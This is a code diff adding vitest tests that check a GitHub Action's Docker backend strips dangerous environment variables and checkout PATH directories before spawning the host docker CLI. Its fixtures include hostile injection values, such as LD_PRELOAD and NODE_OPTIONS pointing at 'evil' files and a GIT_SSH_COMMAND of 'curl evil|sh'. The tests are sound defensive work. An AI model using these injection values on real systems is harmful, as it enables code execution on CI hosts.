@@ -1,7 +1,11 @@
-import { describe, expect, it } from 'vitest';
+import { afterEach, describe, expect, it } from 'vitest';
+import { mkdirSync, mkdtempSync, rmSync } from 'node:fs';
+import { tmpdir } from 'node:os';
+import { delimiter, join } from 'node:path';
 
 import {
   cleanupStagedDockerRepo,
+  createDockerBackend,
   resolveDockerImageRef,
 } from '../../../src/action/backend/docker.js';
 import { BackendUnavailableError } from '../../../src/action/backend/types.js';
@@ -148,5 +152,146 @@ describe('cleanupStagedDockerRepo', () => {
     });
 
     expect(calls).toEqual(['cleanup']);
+  });
+});
+
+// The HOST `docker` CLI is spawned by BARE NAME (resolved via PATH) for EVERY
+// invocation BEFORE the audit trust gate (version probe, pull, `docker run`
+// agent, teardown).  A checkout-prepended PATH dir or an inherited loader var
+// (NODE_OPTIONS, LD_PRELOAD, …) would otherwise run/inject a PR-controlled
+// `docker` on the host pre-trust.  These tests pin that the SAME
+// `stripDangerousEnv` policy used by the host install + the bare backend is
+// applied to the host `docker` spawn env (the in-container script env is a
+// separate concern and is intentionally NOT sanitized).
+
+const savedWorkspace = process.env['GITHUB_WORKSPACE'];
+
+afterEach(() => {
+  if (savedWorkspace === undefined) delete process.env['GITHUB_WORKSPACE'];
+  else process.env['GITHUB_WORKSPACE'] = savedWorkspace;
+});
+
+describe('createDockerBackend — host docker spawns use the sanitized host env', () => {
+  it('strips dangerous selectors and drops checkout PATH dirs from the availability-probe env', async () => {
+    // A real checkout dir so realpath-based containment resolves (mac /tmp symlink).
+    const checkout = mkdtempSync(join(tmpdir(), 'sj-docker-probe-'));
+    const checkoutBin = join(checkout, 'bin');
+    mkdirSync(checkoutBin);
+    // `checkoutRoots()` reads the REAL process env (not deps.env), so a workflow
+    // checkout must be visible there for its bin dir to be recognised + dropped.
+    process.env['GITHUB_WORKSPACE'] = checkout;
+
+    let probeCmd: string | undefined;
+    let probeEnv: NodeJS.ProcessEnv | undefined;
+
+    const backend = createDockerBackend({
+      env: {
+        GITHUB_WORKSPACE: checkout,
+        // checkout-controlled dir prepended ahead of the system dirs
+        PATH: `${checkoutBin}${delimiter}/usr/bin${delimiter}/bin`,
+        // dangerous loader / config selectors that must never reach a host exec
+        NODE_OPTIONS: '--require ./evil.js',
+        LD_PRELOAD: './evil.so',
+        DYLD_INSERT_LIBRARIES: './evil.dylib',
+        GIT_SSH_COMMAND: 'sh -c "curl evil|sh"',
+        NPM_CONFIG_SCRIPT_SHELL: './evil.sh',
+        // legit env that MUST survive
+        HOME: '/home/runner',
+        HTTPS_PROXY: 'http://proxy:8080',
+      },
+      // capture the FIRST host docker spawn (the version probe) then fail it so
+      // run() short-circuits before any staging / `docker run`.
+      commandSucceeds: (cmd, _args, opts) => {
+        if (probeCmd === undefined) {
+          probeCmd = cmd;
+          probeEnv = opts?.env;
+        }
+        return false;
+      },
+    });
+
+    await expect(backend.run({} as BackendContext)).rejects.toBeInstanceOf(
+      BackendUnavailableError,
+    );
+
+    expect(probeCmd).toBe('docker');
+    expect(probeEnv).toBeDefined();
+    const env = probeEnv as NodeJS.ProcessEnv;
+
+    // dangerous selectors dropped
+    expect(env['NODE_OPTIONS']).toBeUndefined();
+    expect(env['LD_PRELOAD']).toBeUndefined();
+    expect(env['DYLD_INSERT_LIBRARIES']).toBeUndefined();
+    expect(env['GIT_SSH_COMMAND']).toBeUndefined();
+    expect(env['NPM_CONFIG_SCRIPT_SHELL']).toBeUndefined();
+
+    // PATH: checkout dir dropped, system dirs kept in order
+    expect(env['PATH']).toBe(`/usr/bin${delimiter}/bin`);
+
+    // legit env preserved
+    expect(env['HOME']).toBe('/home/runner');
+    expect(env['HTTPS_PROXY']).toBe('http://proxy:8080');
+
+    rmSync(checkout, { recursive: true, force: true });
+  });
+
+  it('uses the same sanitized env for the `docker run` agent and the teardown spawns', async () => {
+    const checkout = mkdtempSync(join(tmpdir(), 'sj-docker-run-'));
+    process.env['GITHUB_WORKSPACE'] = checkout;
+    // A repo to stage + a SEPARATE scratch parent (staging cpSync's repoDir into
+    // scratchDir, so they must not be the same tree).
+    const repoDir = join(checkout, 'repo');
+    mkdirSync(repoDir);
+    const scratchDir = mkdtempSync(join(tmpdir(), 'sj-docker-scratch-'));
+
+    let agentEnv: NodeJS.ProcessEnv | undefined;
+    const runCmdEnvs: Array<NodeJS.ProcessEnv | undefined> = [];
+
+    const backend = createDockerBackend({
+      // selfTest so the image-inspect availability path is taken (no `docker pull`).
+      env: {
+        GITHUB_WORKSPACE: checkout,
+        PATH: '/usr/bin',
+        NODE_OPTIONS: '--require ./evil.js',
+        HOME: '/home/runner',
+      },
+      // both the version probe and the image-inspect must pass so run() reaches
+      // the `docker run` agent.
+      commandSucceeds: () => true,
+      // capture the agent spawn env, then resolve so the finally-block teardown
+      // (rm -f + ownership chown) also runs through our seam.
+      runAgentProcess: async (input) => {
+        agentEnv = input.env;
+        return { finalYaml: 'events: []\n', nonFatalWarnings: [] };
+      },
+      runCommand: (_cmd, _args, opts) => {
+        runCmdEnvs.push(opts?.env);
+      },
+    });
+
+    await backend.run({
+      selfTest: true,
+      arch: 'x64',
+      runnerImage: 'ubuntu-24.04',
+      repoDir,
+      scratchDir,
+      configPath: join(checkout, 'config.yml'),
+      extraRepoOverlayFiles: [],
+      manifest: {},
+    } as unknown as BackendContext);
+
+    // the `docker run` agent env is sanitized
+    expect(agentEnv).toBeDefined();
+    expect(agentEnv!['NODE_OPTIONS']).toBeUndefined();
+    expect(agentEnv!['HOME']).toBe('/home/runner');
+
+    // every teardown `docker` spawn (rm -f, ownership-restore chown) is sanitized
+    expect(runCmdEnvs.length).toBeGreaterThan(0);
+    for (const e of runCmdEnvs) {
+      expect(e?.['NODE_OPTIONS']).toBeUndefined();
+    }
+
+    rmSync(checkout, { recursive: true, force: true });
+    rmSync(scratchDir, { recursive: true, force: true });
   });
 });
